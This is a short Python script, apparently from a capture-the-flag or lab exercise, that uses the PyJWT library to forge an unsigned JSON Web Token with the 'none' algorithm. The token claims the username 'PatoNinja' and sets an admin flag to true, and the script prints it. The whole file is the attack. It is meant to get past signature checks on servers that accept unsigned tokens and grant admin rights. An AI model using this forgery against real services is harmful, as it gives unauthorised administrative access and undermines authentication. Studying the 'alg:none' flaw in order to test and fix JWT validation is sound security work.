import jwt
encoded = jwt.encode({'username':'PatoNinja','admin':'true'},'',algorithm='none')
print(encoded)